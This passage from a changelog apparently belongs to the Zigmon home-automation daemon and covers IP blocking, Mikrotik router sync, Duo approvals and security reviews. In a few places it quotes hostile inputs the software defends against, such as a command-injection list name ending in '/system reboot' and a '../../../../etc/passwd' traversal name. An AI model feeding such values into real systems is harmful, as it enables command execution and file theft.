that action through a save, which it did not before.

3.82.0 — opening one wrong address twice filled the log with ten lines. **The
same refusal over and over is one thing that happened, not many.**

A browser asked once asks again by itself: a retry, a reload, a second
connection, a prefetch. Each of those arrived as a line of its own and as a
weight of its own, so two bad addresses read as ten tries and came close to
earning a block.

The same refusal from the same address by the same road within five seconds is
now **one line carrying how many times** - shown as `an unknown link ×6` - and
weighs **once** rather than six times. What was tried is kept as a fingerprint
so this folds only what is truly the same: six different wrong secrets stay
six lines and still earn their block, which is the case the counting exists
for. A press that works is never folded with anything.

    six of the same     -> 1 line, x6, weight 5, not blocked
    six different ones  -> 6 lines, blocked
    three real presses  -> 3 lines

The fingerprint never leaves the database and is never shown; it is the same
one the score has used since 3.77.0 to tell a stale shortcut from somebody
working through a list.

3.81.1 — there was nowhere to define a header for a link because **nothing
needs defining**: any header whose name begins `X-Zigmon-Arg-` arrives as a
fact of that name. `X-Zigmon-Arg-Room: Loznice` is `{room}`. That was true
from 3.79.0 and said nowhere, which is the same as not being true.

The setup guide now has a step for it, between choosing what the link does and
naming it. The writing desk offers those names on Ctrl+Space, marked *send it
in X-Zigmon-Arg-ip*, and a name already used in the text that is not a fact is
offered as one the press should carry.

And **an address the press carries is a target of its own** in the list, above
the rooms and the plugs, with two actions: *let that address back in* and
*keep that address out*. Before this the action existed in the daemon and
could not be chosen on the page.

3.81.0 — **Ctrl+Space in the phrase field**, which is where a name is made up
in the first place. It offered nothing there because the field had no
completer at all: the reply beneath it had one, the phrase never did.

Pressing it in a phrase offers names worth making up - `{ip}`, `{room}`,
`{value}`, `{number}`, `{who}` - and leaves out any the phrase already has.
Pressing it in the reply offers **the names that phrase made**: write
`unban {ip}` above and `{ip}` is the first thing offered below, marked *what
this phrase catches*, beside every other fact.

They belong to the line they are written on and to nothing else - a name made
up in one command means nothing in the next - so they are handed to the
completer by the field rather than kept in the one list of facts that
everything shares.

3.80.1 — *Erase the press log* **had nothing behind it**. It lost its handler
in 3.72.0, when the router's buttons were moved off the blocked card and a
region of the page went with them. The button was still drawn, still wore the
lock, still had its icon - and did nothing at all when pressed, which is the
one kind of broken that looks exactly like working.

I made it worse by testing the wrong half: the endpoint answered perfectly to
`curl`, so I said it worked. What was never checked is whether pressing the
button reached it.

`test/render.js` now presses on the question directly: every button on that
tab and in *Recorded data* must have something behind it, and it names any
that do not.

3.80.0 — you were right: there was a counter nobody could see, and **letting
an address back in did not clear it**. The weight it had earned stood for the
rest of its ten minutes, so the next single thing that address did put it
straight back on the list, and nothing on the page explained why.

Letting one back in now forgets what it did with it - by the cross on the
list, by `zigmon --unban`, or by a text saying *unban*. Being let back in
ought to mean being let back in.

**And the counting is on the page.** Above the blocked addresses, everything
on its way to being kept out: what it has tried, how many times, how much that
weighs against the bar that earns a block, and when it will be forgotten by
itself.

    👁 89.24.5.7   3x a secret that opens nothing · forgotten in 10 min   18 of 15
    👁 10.0.0.9    1x a code that was not right · forgotten in 9 min       3 of 15

A cross beside each forgets that one, and *Forget what they have been doing*
forgets the lot - which lets nobody off the list, it only clears what has been
counted since.

3.79.1 — the dates and the *let back in* in the address log were breaking
across lines. Those cells had asked not to be wrapped since they were written,
but the rule that grants it lives inside a wifi tile, so nowhere else on the
page could use it. It is a rule of its own now, and every table cell that asks
for it gets it.

**And *Erase the approval history* erased the wrong thing as far as anybody
watching could tell.** It clears the press log - every press of a one-tap link
and what came of it - while the table most likely to be open is the address
log beside it, which has a button of its own. It is called *Erase the press
log* now, and says so in the dialogue before it does anything.

3.79.0 — **a message and a press can carry something with them.**

A command's phrase may name what it catches. `unban {ip}` against a text
saying *unban 1.1.1.1* leaves `{ip}` standing for that address wherever the
command uses it - in what it does and in what it answers - so one command
serves every address rather than one command per address. Several names work
too: `set {room} to {temp}`. A phrase with no names in it is matched exactly
as it always was.

A press carries them in headers of its own: **`X-Zigmon-Arg-Room: Loznice`
becomes `{room}`**, and nothing has to be declared - the name of the header is
the name of the fact. A telling link can then say *{room} asked by {who}* and
mean whichever room the press named.

And two things to do with what was carried: **`ban` and `unban`**, on an SMS
command or on a link. `unban {ip}` by text, or a link whose action is *unban*
pressed with `X-Zigmon-Arg-Ip: 1.1.1.1`, lets that address back in - through
the same door as the button on the page, so the router follows and the log
says who asked. Anything that is not an address is refused by name rather than
tried.

    text "unban 1.1.1.1"     -> 1.1.1.1 is let back in
    text "ban 9.9.9.9"       -> 9.9.9.9 is kept out for 60 min
    press with Arg-Ip        -> {"state": "done", "message": "1.1.1.1 is let back in"}

3.78.1 — *already have such entry*, still, and only for IPv6.

A Mikrotik keeps an address-list entry as a **prefix** and prints it as one:
an address given as `2a01:430:17::5` comes back as `2a01:430:17::5/128`.
3.77.3 taught both sides to read an address as an address, and a `/128` is not
an address to `ipaddress` - it is a network holding exactly one - so every
IPv6 entry still looked missing. It was added again on every sync, the router
refused it every time, and the shield beside it never lit.

A prefix that holds one address is that address now, on either side and for
either family: `2a01:430:17::5/128` and `89.24.5.7/32` read as the addresses
they are, while `89.24.5.0/24` and `2a01:430::/48` stay the ranges they are.

3.78.0 — what became of an address is a **log** now, not a summary. A block
and the letting go of it are two things at two times, and they were being kept
as one row with two dates in it, which reads as a report of something finished
rather than as what happened. Each is its own line, newest first:

    2026-09-14 19:55:10  let back in  10.0.0.5     taken off   by hand - me
    2026-09-14 19:55:10  let back in  89.24.5.39   ran out     by itself
    2026-09-14 19:54:09  blocked      89.24.5.39   three wrong secrets  by itself

A block that ran out and one somebody took off are two different endings and
say which; a block made by hand says who made it.

**And it searches and pages like the presses do** - an address, a reason, a
name, over everything ever recorded rather than over the page in front of you,
with the count saying *2 of 82 recorded*. What was written down before this
release is read back as the two events each row stood for, so nothing of the
old history is lost.

3.77.4 — taking an address off the list now takes its line with it there and
then, rather than waiting for the next fetch to bring a list without it. A
fetch that is slow, or refused, or that lands while a list is open or text is
being held, left the line sitting there as though the cross had done nothing -
and the only way to find out it had worked was to reload the page.

The one repaint somebody is waiting to see is not held back for the reason
every other repaint is: it is the answer to something they just asked for.
`test/render.js` blocks an address, presses the cross, and insists the line is
gone.

3.77.3 — **the router was told to add an IPv6 address it already had**, on
every sync, and answered *already have such entry* every time.

My fault, and from two releases ago: 3.77.1 found that a router writes an
address its own way - `2A01:0430:17:0000::0005` where this holds
`2a01:430:17::5` - and mended the mark that says whether the router is
carrying it, and did not mend the syncing beside it. The sync went on
comparing them as letters, so every IPv6 entry looked missing and was added
again.

Both sides of the comparison read an address as an address now. A sync with
nothing changed writes nothing at all, and `test/taps.py` runs three of them
against a router that remembers what it was told and spells things its own
way, insisting that only the first writes anything.

3.77.2 — a block says in words what earned it. *3 in 10 min: bad-secret,
locked-read* is what the daemon thinks; what somebody reading the list wants
is what was actually done:

    3 in 10 min - 3x a secret that opens nothing (3 different ones)
    4 in 10 min - 4x a secret that opens nothing (the same one each time),
                  1x a read that asks for the PIN

Whether the same secret was tried over and over or a different one each time
is the whole difference between a shortcut nobody rewrote and somebody working
through a list, and it was in the score without ever being in the words.
Lines written before this keep their shorthand in the database and are read
out in the same words on the page.

3.77.1 — the mark that says whether the router is carrying an address never
changed. Three reasons.

**It was only looked at where the router is kept in step by itself.** With
*sync* off nothing ever read the router, so every line said *not carried* for
ever. The looking is one read that writes nothing; it happens whenever the
list is looked at, whether or not anything is being written.

**A router writes an address its own way.** `2A01:0430:17:0000::0005` and
`2a01:430:17::5` are one address written twice, and were being compared as
letters, so every IPv6 line read as *not carried*. Both sides are read as
addresses now.

**And a look that failed said nothing at all.** A router that cannot be
reached left the mark sitting at *not carried* with no way to tell why. The
failure is kept and said: in the tooltip of the mark, and once above the list
— *the router could not be read: ssh: connect to host … No route to host*.

3.77.0 — fifteen refusals from one address, and nothing happened. Two reasons,
and both of them were mine.

**The house was immune, not careful.** `block_private` was a yes-or-no, and no
meant *never, whatever it does* - so a phone on a sofa could refuse for ever.
It is three answers now: **never**, **same as anybody**, and **gently**, which
is the new default: three times as much has to happen, and the block always
runs out, so the family is never shut out for good. Fifteen wrong secrets from
the sofa is now a block that lasts an hour; four is not.

**And it could not tell one wrong secret from twelve.** Every refusal was
written down as "a secret that opens nothing", so the part of the score meant
for somebody working through a list never fired for the case it was written
for. What was tried is now marked by its own fingerprint - never the thing
itself, which is nobody's business and is not stored - so a dozen different
secrets weighs far more than the same one a dozen times. The first is a
stranger with a list; the second is a shortcut nobody rewrote.

**And how fast**: more than four tries in ten seconds adds two each. A person
presses a watch face. Five in ten seconds has a keyboard behind it.

All of it counts the same **whichever way the house is set to be opened** - by
address or by a header, with a code or with Duo, pressing or coming back for
an answer. A secret that opens nothing is a secret that opens nothing.

3.76.0 — **the whole of it in both families.** An IPv6 address is blocked,
spared, ranged and kept like any other - that part came free, since addresses
have been read as addresses throughout rather than as strings with dots in
them - but the router was told about one family only.

A Mikrotik keeps its two address lists apart, `/ip firewall address-list` and
`/ipv6 firewall address-list`, and will not take one in the other's list.
Which list an address belongs in is read off the address; **the name is the
same in both**, so the one name in Settings covers the pair. Both are read
when the router is looked at, each address is added to the one it belongs in,
and the lines for pasting by hand say which is which. A router with no IPv6
package answers *no such command* to the second read, which is an answer
rather than a fault: the first list still counts.

Ranges work the same way on either side - `2a01:430::/48` spares a street of
addresses as surely as `192.168.1.0/24` does - and what the whitelist spares
is left out of the lines to paste as well as off the router.

3.75.0 — **addresses that are never kept out**, written as addresses or whole
ranges: `192.168.1.0/24, 89.24.9.9`. It beats a block made by hand as surely
as one made by the detector, which is the point of it - a way of saying *not
this one, ever* that nothing else in the house can overrule.

An address it spares **stays on the list to be seen**, struck through and in
the colour of something that is allowed, saying *let through anyway -
192.168.1.0/24 is never kept out*. It is never enforced, never given to the
router, and one already on the router is taken off at the next sync. So a
range that spares a street shows you exactly which of its houses tried
something, and none of them is shut out.

**And the shield says something fresher.** It was only as new as the last
sync; looking at the list now freshens it by itself, a third of the way into
whatever interval the router is set to and at most every twenty seconds. That
look is one read and writes nothing.

3.74.0 — each blocked address says **whether the router is carrying it too**:
a shield where the router has it, a warning where it does not yet, and nothing
at all where no router is in use - a mark that would read as *no* when it means
*there is no router* is worse than none.

It is what the last look at the router found, and the tooltip says how long
ago that was. With a change here reaching the router in a millisecond and the
looking set to every minute or five, that is very nearly now; where the router
has never been looked at, the mark says so and points at *Sync it now*.

3.73.1 — **how often the router is looked at is a choice** now: only when
something changes here, or every minute, two, five, ten or thirty on top of
that.

A change here has always reached the router at once and still does - an
address blocked is a rule there a **millisecond** later, on a thread of its
own so nothing waits on a router that is slow or away. What the interval is
for is the other direction: a temporary block that ran out, and anything
somebody changed on the router itself. Five minutes was written into the
daemon; now it is in Settings, and *only when something changes here* is one
of the answers.

3.73.0 — the router's key is handled exactly as the access points' key is.
*Use my own* opens the machine's own file dialogue and reads the key out of
the file chosen, rather than a box to paste into; *Download it* saves the
private half as a file through an address of its own, rather than putting the
public half on the clipboard - which was a different thing wearing the same
word. *Download it* and *Forget it* are switched off while there is no key,
as they are there.

**And a refusal was arriving as a file with a key's name.** The relay passed
the daemon's answer straight through without looking at what it was, so a
download asked for with an expired session came back as
`zigmon-ap-key` - a file holding the words *view locked*. It was not a leak,
but it is a download that looks like a key, and somebody would have put it on
a router and wondered. Both downloads now answer with the code the daemon
gave: 403 for a session that is not one, 404 where no key is stored.

3.72.3 — the PIN was not the trouble. Driving the panel with editing unlocked
shows the request going out with its session and the daemon answering:

    POST ?api=mikrotik {"pin":"","do":"generate","session":"_gu2XFPM…"}
    ssh-keygen is not installed (dnf install openssh-clients)

**That is what a button that seems to do nothing was doing**: failing for a
reason it only said in a toast that had already gone. The panel asks the
daemon what the machine can do and says so before anything is pressed - the
two buttons that make a key are switched off where `ssh-keygen` is not
installed, with the command to install it - and the same for the ssh client
itself, without which the router cannot be reached at all.

`dnf install openssh-clients` is what an AlmaLinux minimal wants; the access
points have always needed it too, and said so only in the same disappearing
way.

3.72.2 — **choosing *a password* for the router left nowhere to type one.**

The boxes that belong to a choice were left out of the drawing while the
choice said otherwise, and put back by drawing the settings again - but
drawing them again throws away everything else typed and not yet saved, so it
is refused while anything is. Choosing *a password* marks the settings as
having something unsaved in them, which is precisely the state in which the
redraw would not run. The box appeared at the next save, which is the one
thing that could not happen without it.

They are drawn either way now and shown or hidden as the choice is made, the
way the access points have always done it. Choosing *a password* puts the
password box there at once; choosing *a key* puts the key panel back; and
whatever else was typed and not yet saved is still sitting there afterwards.

3.72.1 — **the buttons on the blocked list did nothing and asked for the PIN
over and over**, even with editing unlocked.

Three names are read with a GET and worked with by a POST - the blocked list,
the presses, the router - and each is written twice in the relay: once as a
branch of its own for the reading, once in the map of POST names. The branch
stands first and said nothing about which method it takes, so **every press
went out as a GET**. A GET of those wants the PIN in a session rather than in
a body, so it was refused with *view locked*; the page, which is built to
offer an unlock when it meets those words, offered one - and the next press
did the same thing again.

Each branch now says which method it is for. `test/endpoints.py` finds any
name written in both places and refuses one whose reading branch would take a
press as well; put back the way it was, it names `blocked` and fails.

3.72.0 — the buttons went where they belong. *Addresses that may not talk to
this* had grown seven of them, three of which were about a router and one of
which erased something recorded.

**The card keeps the list and working on it**: block this one, block it for
good, take them all off. Nothing else.

**The router keeps what is about the router** — try it, sync it now, copy the
lines for pasting by hand, and beneath them the key: make one, use my own,
download it, forget it. All in its own section in Settings, where the router
is set up. *Try the router* had ended up in two places at once; there is one
of it now.

**Recorded data keeps the erasing**, beside the other recorded things: *Erase
the approval history* and *Erase the blocked history* now sit with *Erase
history*, *Erase events* and the rest, rather than one of them being on the
card and one of them being here.

3.71.2 — **two buttons were drawn as nothing at all.** An icon is asked for by
name, and a name nobody drew makes an empty `<svg>` rather than a complaint:
*Make a key* wanted a key and *Sync the router now* wanted a going-round-again,
and neither had ever been drawn. Both are now. The check in `test/render.js`
was fooled the same way - it looked for an `<svg>` and found one - and now
insists there is something inside it.

**And the way the router logs in decides which boxes are asked for.** With a
key, the password box is not there and the key panel is; with a password, the
other way about. It changes as the choice is made rather than at the next
report, the way the access points have always done it.

3.71.1 — the tab is called **Public API**. It began as the presses of a
one-tap link and has become the page for the whole of what this answers from
outside: what was asked for, what checked it, what came of it, and who is not
allowed to ask at all. The name follows.

3.71.0 — *Every press, and what came of it* gets what the events have: a
**search, an ending to filter by, pages, and how many per page**. The search
is done in the database, not on the page - a house that has been running a
year has more presses than a browser wants handed to it, and the answer to
*when did that address last try* is in the old ones, not the new. It says what
it found the same way the events do: *46 of 320 recorded · 1-46*.

Searching covers the link, what it would do, the address that made it, what
checked it, which road it came by and how it ended, so `refused` and
`89.24.5.7` and `Duo` are all things to type into it.

And **the blocked addresses moved below the presses**, which is the order they
are read in: what happened, then who is being kept out because of it.

3.70.0 — the settings for keeping addresses out, and for the router that
carries the list, were mixed in among the one-tap links. They are **two
sections of their own** now: *Keeping addresses out* and *The router that
carries the list*.

**And the router's key is made where the router is set up**, the way the
access points have always had theirs: make a key, use my own, download it,
forget it, try the router - under its own boxes in Settings, not on the page
where addresses are kept out. That page keeps only what belongs to it.

**The key is in the backups.** It goes into a settings export that was asked
to carry the secrets, comes back on import with its public half worked out
again, and `zigmon --secret` lists it beside the router's password. An export
without the secrets does not hold it, as with every other secret.

**And the box for typing an address had no style at all** - it was whatever
the browser draws a bare input as, beside buttons that all have a shape. It
has the shape every other box on the page has, in the typeface an address
should be read in.

3.69.2 — a reading for faults, leaks and lag after a fortnight of building.
Two things.

**A message preview had become ten times dearer than it was.** The facts added
in 3.68.0 counted presses by pulling five hundred rows out of the database and
counting them here - three times over, for three of the facts - and the page
asks for nine previews on every draw. The database counts them now, in one
query: **4.59 ms down to 0.45 ms**, with the same numbers coming out. Building
the status was never in that path and is unchanged at a quarter of a
millisecond.

**Who pressed what, and who is being kept out, was readable by anybody.**
Those two are not a view of the house but the shape of its own guard - the
link names, the addresses that pressed them, the blocklist and what earned
each entry - and they sat outside the lock that 3.64.0 put in front of the
export and the log. They ask for the PIN now, however the view itself is set.
The tab says so in place of the lists, once, rather than asking for the PIN
every second.

What was measured and found well: the gate that stands in front of every
request costs **three ten-thousandths of a millisecond** on a hit and seven on
a miss, so nothing pays for the blacklist being there; the list itself builds
in a sixth of a millisecond with sixty addresses on it, and the presses tab in
under one with four hundred rows behind it.

3.69.1 — the new tab had two of the page's three habits. Every button carried
an icon; the rows did not answer the pointer, and the buttons that change
something did not wear the lock.

**A row under the pointer** now takes the same tint and outline every other
row on the page takes, and the cross at its end comes up out of half-light as
the pointer arrives, the way a delete does everywhere else.

**And the lock.** `cmdButton` and `iconButton` put it on by themselves, which
is why the rows were right and the card was not: the buttons written into the
markup are given it by hand, and these nine were not on that list. A locked
dashboard now looks locked here too, rather than only behaving that way when
something is pressed.

`test/render.js` holds the tab to all three: it refuses a button with no icon,
a button that changes something without the lock, and a row with nothing to
say to the pointer.

3.69.0 — four things the blacklist wanted.

**A switch for the whole of it.** Off means nothing is kept out - and nothing
of this is left on the router either, because a rule there that outlives the
thing that made it is a rule nobody can explain. The addresses themselves are
kept: a house that switches it off for an afternoon should not have to write
them out again, and switching it back on fills the router from what was kept.
Asking the router to sync while it is off is refused rather than quietly
emptying it.

**A range, written the usual way.** `89.24.5.0/24` is one line keeping out a
street rather than thirty keeping out its houses, by hand or from the command
line, and an address inside it is kept out while one outside it is not.

**A block that runs out goes into a history that keeps all of them.** The
countdown was already on the line; now, when it reaches nothing, the line
leaves the list and joins *every address that was ever kept out* - when it was
blocked, when it was let back in, what earned it, how it ended (ran out, taken
off), and how many times it was turned away while it lasted. Erased on its
own, beside the list.

**And how keen it is, is yours to set.** The same behaviour, a lower or a
higher bar: *forgiving* asks for more before it acts, *keen* for less, and the
span the weight is added up over is a setting too. Three wrong secrets is a
block at *normal* and *keen*, and not at *forgiving*.

3.68.0 — the command line and the facts catch up with everything of the last
dozen releases.

**Five commands.** `--presses` for every press of a one-tap link and what came
of it, waiting ones first. `--blocked` for the addresses that may not talk to
the API, `--blocked ADDRESS` to add one (`--force` for good), `--unblock
ADDRESS` or `--unblock all` to let them back in, and `--blocked mikrotik` for
the lines a router takes. `--mikrotik show | test | sync | generate | forget`
for the router that carries the list and the key it logs in with.

The reads these need are the ones that hold the PIN in front of them since
3.64.0, and the command line has no PIN to give - so a local tool with the
API token, which can read the database directly anyway, is let through, while
a browser coming by the relay is not: the relay always says whose browser it
is relaying for, and the command line never does.

**Eighteen new facts**, so a message can say any of it: `{second_factor}`,
`{tap_mode}`, `{tap_links}`, `{tap_phones}`, `{duo_user}`, `{duo_device}`,
`{duo_ready}`, `{presses_waiting}`, `{presses_today}`,
`{presses_refused_today}`, `{blocked_count}`, `{blocked_list}`,
`{blocked_last}`, `{blocked_last_why}`, `{blocking}`, `{mikrotik}`,
`{mikrotik_list}` and `{mikrotik_synced}`. A hundred and fifty-nine facts now,
every one offered by the picker and every one filled.

3.67.0 — **the blocked list is carried to a Mikrotik**, so the packets stop at
the router rather than at the dashboard.

It logs in over SSH the way the access points do - a key this daemon makes and
holds, or a password - with the same dialogue, the same *make a key*, *forget
it*, and the public half to copy onto the router. Its address, port, user and
the **name of the address list** are in Settings; *Sync the router now* and
*Test the router* are beside the list itself, under Public API. With
*mikrotik_sync* on it follows every change here and looks again every five
minutes, on a thread of its own, so nothing waits on a router that is slow or
away.

**Nothing outside that one list is read, written or touched.** Inside it, only
the entries this put there: every one carries a comment beginning `zigmon:`,
and a removal insists on that mark, so an address somebody added by hand under
the same list name is left exactly as it is - counted and reported, never
removed. The list name is held to the letters a list name may have rather than
quoted and hoped for: `zig mon; /system reboot` becomes `zigmonsystemreboot`,
and an empty one is refused.

A sync of three states reads as *1 added, 1 taken off, 1 of theirs left
alone*, and `test/taps.py` holds it to exactly that, command by command.

3.66.0 — **an address that behaves like somebody trying things stops being
answered at all.**

What counts as trying things is **weighed, not counted**. A wrong secret is
somebody who has none, and weighs five. A wrong code is often a phone whose
clock has drifted, and weighs three. A shut road, being turned away for too
many tries, a locked read: three, three, two. And trying several *different*
links weighs more on top of that, because somebody looking for what exists is
not somebody whose shortcut was never rewritten. Fifteen in ten minutes earns
a block, which is three wrong secrets or five wrong codes; the bar is a
setting, as is whether a block lasts an hour or until somebody takes it off.

**The house is left alone.** A phone on the sofa with an old shortcut cannot
shut the family out: private addresses are never blocked by the daemon itself
unless you say so, and the loopback the relay comes in on never is at all.

**Behind a server of its own it still knows who it is talking to.** The
forwarded address is believed only when the request came from an address named
under *trusted proxies*; from anybody else it is a claim, and the address they
really came from is what counts - otherwise a guesser picks a new claim per
try and is never blocked at all.

The list is under **Public API**, each line saying what earned it, when, how
many times the address has been turned away since, and whether the daemon or a
person put it there. A cross takes one off; an address can be added by hand
for a while or for good. It is in the database, so it keeps.

**And it is ready to be a firewall's list too.** *Copy for a Mikrotik* gives
the same addresses as `/ip firewall address-list add list=zigmon address=…
timeout=…` lines, timeouts and comments intact, so blocking at the router can
be added later without keeping a second list by hand.

3.65.0 — **the settings export was not a copy of the house.** Restoring a
fresh install from one left every one-tap link gone, every phone's
authenticator gone, the whole of Settings unchanged from its defaults - no
second factor, no Duo, no SMS gateway, none of the choices. Everything that
had been built in the last dozen releases was outside it, because each of
those releases added a thing and none of them added it here.

It carries them now: **Settings**, the **links** and the **phones**, beside
the rules, scenes, schedules, rooms and the rest that were always there. A
restore is the same house.

**And the secrets go in only when they are asked for.** A person exporting
because they want a copy of their layout should not be handed a file that
opens their garage - and it is a file, on a laptop, in a Downloads folder, for
years. *Download settings* leaves out every link's secret, every phone's
secret, the Duo key and the gateway and router passwords; the restore is
complete in every other way, and the links and phones come back with **fresh**
secrets, to be paired again from their QR codes. *Download with secrets*, in
red beside it, says plainly what the file will hold, and the taking of one is
written down in the audit log.

3.64.1 — a second reading, looking for the things that let somebody run
something: command injection, SQL built by hand, a file name naming a place it
should not, a POST that acts without being asked for anything. Nothing of the
kind was there, and the reading is written down here so the next one can start
from it rather than from nothing.

**Nothing is ever handed to a shell.** Every `subprocess.run` is given a list,
not a line, so nothing in an argument can end it and start a command of its
own. The one thing that does reach a remote shell - a read-only command on an
access point - is chosen from a fixed list by name, and a name that is not on
it raises rather than runs. No `eval`, no `exec`, no `pickle`, no `yaml.load`.

**Every query is parameterised.** The four that build a string do it with a
table name out of a fixed tuple written in the source; no value from outside
is ever part of a statement.

**Eighty POST names, none of which act without the PIN.** Asked with an empty
body over the web: every one refused.

**Ten hostile file names, none of which named a place outside the folder they
belong in** - `../../../../etc/passwd`, a name with a null in it, a name with
a semicolon and a command after it. Uploading takes the separators out rather
than refusing, and now takes the dots too: a name that is safe only because
you have worked out why is a name the next reader has to work out again.

`test/taps.py` keeps the ten.

3.64.0 — **`/api/export` handed out the passwords to anybody who could reach
the page.** No PIN, no session, no token: the sockets' password, the router's
password and its ssh key, every person's phone number and MAC address, and a
person's own token, in one JSON.

`public_view` means anybody may watch the house. It was taken to mean anybody
may read its keys. Ten reads are not a view of the house at all but the whole
of how it is set up — the export, the daemon's log, the SMS conversation, the
managed devices, the broker's ACL, the backups — and those ask for the PIN
whatever the view is set to. The dashboard offers to unlock when it meets one,
as it already does for a locked view.

I found it by asking every name the page can call, with nothing at all: **133
names, 33 answering with data.** Thirty of those thirty-three are the house as
it stands, which is what a public view is for. Three were not.

`test/endpoints.py` holds the daemon to that list, and to the lock standing
before the `public_view` gate rather than after it — behind it, it would never
run for the very setting it exists to correct.

3.63.1 — the rows under *Every press, and what came of it* take the hand a row
on the network takes: alternating bands, and under the pointer a tint with a
line down the edge. Eight columns is a long way for an eye to travel without
one.

The line is drawn on the first cell rather than on the row, because with
`border-collapse` a shadow on a row is drawn underneath the cells and comes
out clipped - which is the sort of thing that looks like the rule not working
at all.

3.63.0 — the tab is **every press of a one-tap link**, not the ones that wait
for somebody. A list is worth looking at only if what is not in it did not
happen, and that one held a quarter of the story: a press approved through
Duo. A press by its address, a press with a six-digit code, a press with a
wrong code, a press at a link that does not exist - none of them were
anywhere but the log.

Each line says which road it came by, **what checked it** - Duo and which
device, a code, or nothing and why there was nothing - who made it, what it
would do, and how it ended: done, told you, asked and changed nothing,
refused, called off here, nobody answered.

And it is **in the database** rather than in the daemon's memory, so a restart
does not take it with it. Erasing is where the other recorded things are
erased, in Control → System → *Recorded data*.

One thing that fell out of writing it: a press approved through Duo was
written down twice, once as itself and once, afterwards, as a press by its
address - because the acting half of it is called with no road in hand and
took the default. One press is one line now.

3.62.2 — three more from the same tab.

**Behind a server of its own, every press comes from that server.** *Asked
from 10.8.0.1* on every line tells nobody anything. What the server in front
says the caller was is shown beside it now — *10.8.0.1 (says 89.24.5.7)* — and
shown as what it is: a claim, since anyone may send that header. Where the
home server is told to trust the one in front (`set_real_ip_from`, in
`deploy/nginx-tap-front.conf`), the two agree and nothing extra is said.
Guesses are still counted against the address the request really came from; a
guesser who could pick a new claim per try would never fill the counter.

**The tab took away whatever was selected, every second.** The clock has to
move; the rows do not. It rebuilds only when a press starts or ends, and
otherwise touches nothing but the seconds — and while a list is open or text
is being held, it does not even do that, like every other live thing on the
page.

**And the device is shown by name** wherever it appears, not only in the
waiting rows: what Duo calls it, not the twenty letters it files it under.

3.62.1 — three things the new tab wanted.

**A link that tells you something read as nonsense.** *Osoby would own tell* -
the two halves of a link's record are a target and an action, and read
straight out they make a mess of the one kind whose target is not a thing at
all. It says *tell you how the house is* now, the same words the rest of the
page uses for it.

**The device was named by its id.** *pushed to DPQDHZC82JJ1TL6F00EB* is the
twenty letters Duo files it under; the card knows what Duo calls it, and says
*pushed to iPhone16 (+420 603 364 754)*.

**The buttons had no icons**, alone among the buttons on the page. And the
approval history can now be erased from Control → System → **Recorded data**,
beside the other recorded things: what became of the finished ones is thrown
away, and anything still waiting is left alone, having not become anything
yet.

3.62.0 — **Approvals**, a tab of its own between Events and Control, and the
answer to the question that asked for it.

**Could the waiting overwhelm the server?** It could, and it took three
hundred requests to show it: thirty links pressed ten times over held **three
hundred connections and six hundred and forty threads**, because the press was
deduplicated - twenty presses of one link ask Duo once - but the *waiting* was
not. Twenty people holding a door open for the same person is still twenty
people standing there, and in production each one is a php-fpm worker too.

Two ceilings now. A press that finds one already waiting for that link is
answered at once with its ticket, since the first press is already holding a
request open and a second changes nothing about when the answer comes. And no
more than two dozen requests are held here at any moment; past that a press is
answered at once and whoever wants the outcome comes back for it. The same
three hundred requests: **276 answered at once, 24 held, 87 threads**, and the
status still built in a third of a millisecond throughout.

**And what is waiting is now something you can look at.** Each one says what
it would do, who asked, which device was rung and how many seconds it has
left, counting down. A cross calls one off; one button calls off the lot.
Calling off is not undoing - nothing has happened yet - it tells the press
that nobody is going to answer, so an approval arriving half a minute later
finds it called off and does nothing. Underneath, what became of the last two
hundred: approved and done, not approved, called off here, nobody answered -
with the link, what it would have done, and where it was asked from.

3.61.0 — a reading of the whole of the one-tap road, for putting it on the
internet behind a server of its own. Three things came out of it.

**A header from the internet was written into a header line unfiltered.** The
relay joins its lines with CRLF, and every value in them came from outside: a
secret carrying a carriage return would end its own line and start one of its
own choosing — `X-Zigmon-Client`, say, which decides whose guesses are being
counted. Servers in front strip those, which is a reason to be careful and not
a reason to lean on them. Each value is cut down to the letters it is allowed
to have.

**A link could be pressed as fast as the network allows.** Every press was a
push at somebody's phone and a request held open here waiting for an answer:
the phone made unusable and the web server's workers with it, by somebody who
has to be right about nothing but the secret. A press while one is already
waiting is answered with the one already waiting, so twenty presses are one
question and one held request.

**And there is now a file for the server that faces the internet** —
`deploy/nginx-tap-front.conf`. It carries one address and refuses everything
else, holds it to POST, rate-limits it, passes the caller on so guesses are
counted against the phone that made them rather than against the proxy, and
gives the request the two minutes an approval may take. Everything not written
in it cannot be reached by forgetting a rule. `test/nginx.py` reads every
nginx file that ships rather than the dashboard's alone, and refuses one that
carries the dashboard's own locations or leaves that address unlimited.

Nothing else turned up: fifteen shapes of rubbish at the exposed endpoint —
no body, a body that is not JSON, four-thousand-character headers, a path
trying to climb out of itself, a forged `X-Zigmon-Client` — and not one crash
or leak among them. An unknown secret and a secret whose road is shut answer
the same words at the same speed.

3.60.1 — **the shortcut is one action again.** A press that has to be approved
came back with a ticket rather than with the thing done, and fetching the
outcome meant three more actions on a watch: pull the ticket out, send it back
in a header, read the answer. A person standing at a door is waiting either
way.

So the answer is held until there is something to say. One *Get Contents of
URL*, and what comes back is what happened - *Light-Chodba is on* - once the
push has been approved. Refused says so; nothing happening in time says that.
A shortcut that would rather not wait sends `{"wait": false}` and gets the
ticket to come back for, exactly as before.

3.60.0 — **which device the push goes to** is now a choice rather than Duo's
guess. A press was addressed to `auto`, and on an account with three devices
enrolled, auto is as likely to pick the iPad on a shelf as the phone in your
pocket.

*Test Duo* keeps what the account answers about its devices, and the card
offers them in a list: *whichever Duo picks*, or one by name, with the ones
that cannot take a push said so. Choosing one saves it, and every press after
that is addressed to it.

3.59.1 — **every press through Duo was refused a fifth of a second after it
was made**, before the phone had finished buzzing.

What `/auth/v2/auth_status` answers is a `result` — *waiting*, *allow* or
*deny*. The published client's own `auth_status()` method turns that into
`waiting` and `success`, and this asks the endpoint directly, so it gets
neither: the code read `waiting` off an answer that has no such key, found
nothing, took that for *not waiting any more*, then read `success`, found
nothing again, and called it refused. One look at the log said it: an `auth`
and a single `auth_status` two hundred milliseconds apart, and then silence.
Both shapes are read now, because which one arrives depends on which road the
request took.

**And the test button now says whether a push can arrive at all.** It listed
the user's devices; it checks that at least one of them can take a push, and
says which, because a user enrolled with only a hardware token looks exactly
like a working setup until the first press goes nowhere.

The debug log carries what came back rather than only that something did —
`result=waiting, status=pushed`, `result=allow`, the devices and what each can
do. Still no keys, no header, no code.

3.59.0 — **Duo's own package does the talking, where the machine has it.**

`pip install duo-client`, and every request to Duo goes through it: it is the
reference for every detail of the signing, and four releases went by here
